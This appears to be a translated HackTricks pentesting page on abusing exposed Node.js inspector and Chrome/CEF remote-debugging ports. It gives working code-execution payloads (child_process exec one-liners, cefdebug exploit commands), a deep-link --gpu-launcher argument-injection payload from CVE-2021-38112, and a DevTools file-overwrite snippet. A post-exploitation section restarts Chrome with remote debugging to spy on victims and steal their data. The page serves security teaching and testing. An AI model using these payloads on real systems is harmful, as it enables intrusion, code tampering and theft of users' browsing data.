# Node inspector/CEF debug abuse

{{#include ../../banners/hacktricks-training.md}}

历史上的实际案例包括 Multimaster walkthrough 和 CVE-2019-1414 Visual Studio Code debugger attack；应将它们作为特定版本的背景参考，而不要假设所有当前的 Electron 或 Chromium 目标都暴露相同的 primitives。<sup>[[1]](#references)[[3]](#references)</sup>

## 基本信息

[根据文档](https://nodejs.org/learn/getting-started/debugging)：使用 `--inspect` switch 启动时，Node.js process 会监听 debugging client。**默认**情况下，它会监听主机和端口 **`127.0.0.1:9229`**。每个 process 还会被分配一个**唯一**的 **UUID**。<sup>[[4]](#references)</sup>

Inspector clients 必须知道并指定主机地址、端口和 UUID 才能连接。完整 URL 类似于 `ws://127.0.0.1:9229/0f2c936f-b1cd-4ac9-aab3-f63b0f33d55e`。<sup>[[4]](#references)</sup>

> [!WARNING]
> 由于 **debugger 可以完全访问 Node.js execution environment**，能够连接到此端口的恶意 actor 可能会代表 Node.js process 执行 arbitrary code（**潜在的 privilege escalation**）。<sup>[[4]](#references)</sup>

启动 inspector 有多种方式：<sup>[[4]](#references)</sup>
```bash
node --inspect app.js #Will run the inspector in port 9229
node --inspect=4444 app.js #Will run the inspector in port 4444
node --inspect=0.0.0.0:4444 app.js #Will run the inspector all ifaces and port 4444
node --inspect-brk=0.0.0.0:4444 app.js #Will run the inspector all ifaces and port 4444
# --inspect-brk also pauses at the start of the user script

node --inspect --inspect-port=0 app.js #Will run the inspector in a random port
# Note that using "--inspect-port" without "--inspect" or "--inspect-brk" won't run the inspector
```
当你启动一个经过检查的进程时，会出现类似这样的内容：<sup>[[4]](#references)</sup>
```
Debugger ending on ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
For help, see: https://nodejs.org/en/docs/inspector
```
基于 **CEF**（**Chromium Embedded Framework**）的进程可以通过 `--remote-debugging-port=9222` 暴露 debugger。该方式通过 [**Chrome DevTools Protocol**](https://chromedevtools.github.io/devtools-protocol/) 暴露浏览器，而不是 Node.js inspector，因此默认情况下，基于 Node.js `process` 的 payload 不直接适用。<sup>[[2]](#references)[[5]](#references)</sup>

启动带有调试功能的浏览器时，将出现类似以下内容：<sup>[[2]](#references)[[5]](#references)</sup>
```
DevTools listening on ws://127.0.0.1:9222/devtools/browser/7d7aa9d9-7c61-4114-b4c6-fcf5c35b4369
```
### 浏览器、WebSockets 和 same-origin policy <a href="#browsers-websockets-and-same-origin-policy" id="browsers-websockets-and-same-origin-policy"></a>

在 web-browser 中打开的网站可以在浏览器安全模型下发起 WebSocket 和 HTTP 请求。必须建立**初始 HTTP 连接**才能**获取唯一的 debugger session id**。**same-origin-policy** **会阻止**网站建立**此 HTTP 连接**。为了进一步防御 [**DNS rebinding attacks**](https://en.wikipedia.org/wiki/DNS_rebinding)**，**Node.js 会验证连接的 **'Host' headers** 是否明确指定了**IP 地址**或 **`localhost`**。<sup>[[4]](#references)</sup>

> [!TIP]
> 这些**安全措施会阻止仅通过**发送 HTTP 请求来利用 inspector 执行代码（这可以通过利用 SSRF vuln 实现）。<sup>[[4]](#references)</sup>

### 在运行中的进程中启动 inspector

你可以向正在运行的 nodejs 进程发送 **signal SIGUSR1**，使其在默认端口启动 **inspector**。不过请注意，你需要拥有足够的权限，因此这可能会授予你对进程内部信息的**特权访问权限**，但不会直接造成 privilege escalation。<sup>[[4]](#references)</sup>
```bash
kill -s SIGUSR1 <nodejs-ps>
# After an URL to access the debugger will appear. e.g. ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
```
> [!TIP]
> 这在容器中很有用，因为使用 `--inspect` **关闭进程并启动新进程** **不是一个选项**，原因是**容器**会随着进程一起被**终止**。<sup>[[6]](#references)</sup>

### 连接到 inspector/debugger

要连接到基于 **Chromium** 的浏览器，可以分别访问 Chrome 或 Edge 的 `chrome://inspect` 或 `edge://inspect` URL。点击 Configure 按钮后，应确保正确列出了**目标主机和端口**。该图展示了一个 Remote Code Execution (RCE) 示例：<sup>[[2]](#references)[[4]](#references)</sup>

![访问 debugger 的 URL 出现后。例如 ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d - 连接到 inspector/debugger：要连接到基于 Chromium 的浏览器，...](<../../images/image (674).png>)

使用**命令行**可以通过以下方式连接到 debugger/inspector：<sup>[[2]](#references)[[4]](#references)</sup>
```bash
node inspect <ip>:<port>
node inspect 127.0.0.1:9229
# RCE example from debug console
debug> exec("process.mainModule.require('child_process').exec('/Applications/iTerm.app/Contents/MacOS/iTerm2')")
```
工具 [**https://github.com/taviso/cefdebug**](https://github.com/taviso/cefdebug) 可用于**查找**本地运行的 inspector，并向其中**注入代码**。<sup>[[2]](#references)</sup>
```bash
#List possible vulnerable sockets
./cefdebug.exe
#Check if possibly vulnerable
./cefdebug.exe --url ws://127.0.0.1:3585/5a9e3209-3983-41fa-b0ab-e739afc8628a --code "process.version"
#Exploit it
./cefdebug.exe --url ws://127.0.0.1:3585/5a9e3209-3983-41fa-b0ab-e739afc8628a --code "process.mainModule.require('child_process').exec('calc')"
```
> [!TIP]
> 请注意，如果通过 [**Chrome DevTools Protocol**](https://chromedevtools.github.io/devtools-protocol/) 连接到浏览器，**NodeJS RCE exploits** 将无法生效（你需要检查 API，以找到可以利用它执行的有趣操作）。<sup>[[2]](#references)[[5]](#references)</sup>

## NodeJS Debugger/Inspector 中的 RCE

> [!TIP]
> 如果你是想了解如何[**从 Electron 中的 XSS 获取 RCE，请查看此页面。**](../../network-services-pentesting/pentesting-web/electron-desktop-apps/index.html)

当你可以**连接**到 Node **inspector** 时，获取 **RCE** 的一些常见方法是使用类似以下的方式（看起来这**无法通过连接到 Chrome DevTools protocol 生效**）：<sup>[[2]](#references)</sup>
```javascript
process.mainModule.require("child_process").exec("calc")
window.appshell.app.openURLInDefaultBrowser("c:/windows/system32/calc.exe")
require("child_process").spawnSync("calc.exe")
Browser.open(JSON.stringify({ url: "c:\\windows\\system32\\calc.exe" }))
```
## Chrome DevTools Protocol Payloads

你可以在此处查看 API：[https://chromedevtools.github.io/devtools-protocol/](https://chromedevtools.github.io/devtools-protocol/)。<sup>[[5]](#references)</sup>
本节将仅列出我发现有人利用此 protocol 进行 exploit 的有趣方法。

### 通过 Deep Links 进行参数注入

在 [**CVE-2021-38112**](https://rhinosecuritylabs.com/aws/cve-2021-38112-aws-workspaces-rce/) 中，Rhino security 发现，一个基于 CEF 的应用程序在系统中 **注册了自定义 UR**I（workspaces://index.html），该 URI 接收完整 URI，随后使用由该 URI 部分构造的配置 **启动了基于 CEF 的应用程序**。<sup>[[8]](#references)</sup>

研究人员发现，URI 参数会经过 URL 解码，并用于启动基于 CEF 的应用程序，从而允许用户在 **command line** 中 **注入** **`--gpu-launcher`** flag，并执行任意操作。<sup>[[8]](#references)</sup>

因此，类似下面这样的 payload：
```
workspaces://anything%20--gpu-launcher=%22calc.exe%22@REGISTRATION_CODE
```
将执行 calc.exe。<sup>[[8]](#references)</sup>

### 覆盖文件

更改**下载文件的保存位置**，并下载一个文件，用你的**恶意代码**覆盖应用程序中经常使用的**源代码**。<sup>[[5]](#references)[[6]](#references)</sup>
```javascript
ws = new WebSocket(url) //URL of the chrome devtools service
ws.send(
JSON.stringify({
id: 42069,
method: "Browser.setDownloadBehavior",
params: {
behavior: "allow",
downloadPath: "/code/",
},
})
)
```
### Webdriver RCE 和 exfiltration

STAR Labs 证明，暴露的 WebDriver/CDP 服务可以实现任意文件读取和 RCE；在某些配置中，DNS rebinding 可以完成整个 exploit chain。<sup>[[9]](#references)</sup>

如需了解更多历史上的 browser-automation 和 Chromium security 案例，请参阅 Counter WebDriver write-up 以及 Project Zero issues 773、1742 和 1944。<sup>[[10]](#references)[[11]](#references)[[12]](#references)[[13]](#references)</sup>

### Post-Exploitation

在真实环境中，**compromising** 一台使用基于 Chrome/Chromium 的 browser 的用户 PC **之后**，你可以启动一个启用了 **debugging 并对 debugging port 进行 port-forward** 的 Chrome process，从而访问它。这样，你就能够 **inspect victim 使用 Chrome 执行的所有操作并 steal sensitive information**。<sup>[[7]](#references)</sup>

更隐蔽的方法是 **terminate every Chrome process**，然后调用类似以下内容：<sup>[[7]](#references)</sup>
```bash
Start-Process "Chrome" "--remote-debugging-port=9222 --restore-last-session"
```
## References

- [1] [HackTheBox - Multimaster (IppSec)](https://www.youtube.com/watch?v=iwR746pfTEc&t=6345s)
- [2] [taviso/cefdebug - CEF/Chromium debugger 检查与 exploitation 工具](https://github.com/taviso/cefdebug)
- [3] [CVE-2019-1414: Visual Studio Code 通过 Chrome DevTools Debugger 远程代码执行](https://iwantmore.pizza/posts/cve-2019-1414.html)
- [4] [Node.js Debugging 指南 - 入门](https://nodejs.org/learn/getting-started/debugging)
- [5] [Chrome DevTools Protocol](https://chromedevtools.github.io/devtools-protocol/)
- [6] [corCTF 2021 Writeup - saasme (Larry Yuan)](https://larry.science/post/corctf-2021/#saasme-2-solves)
- [7] [Post-Exploitation: Abusing Chrome 的 Debugging Feature 远程观察和控制 Browsing Sessions](https://embracethered.com/blog/posts/2020/chrome-spy-remote-control/)
- [8] [CVE-2021-38112: AWS WorkSpaces 远程代码执行](https://rhinosecuritylabs.com/aws/cve-2021-38112-aws-workspaces-rce/)
- [9] [你在和我说话吗？- 通过 DNS Rebinding 和 CDP 实现 WebDriver RCE (STAR Labs)](https://starlabs.sg/blog/2021/04-you-talking-to-me/)
- [10] [Counter Webdriver - 从 Bot 到 RCE](https://medium.com/@knownsec404team/counter-webdriver-from-bot-to-rce-b5bfb309d148)
- [11] [Google Project Zero Issue 773 (Chromium bug tracker)](https://bugs.chromium.org/p/project-zero/issues/detail?id=773)
- [12] [Google Project Zero Issue 1742 (Chromium bug tracker)](https://bugs.chromium.org/p/project-zero/issues/detail?id=1742)
- [13] [Google Project Zero Issue 1944 (Chromium bug tracker)](https://bugs.chromium.org/p/project-zero/issues/detail?id=1944)
{{#include ../../banners/hacktricks-training.md}}
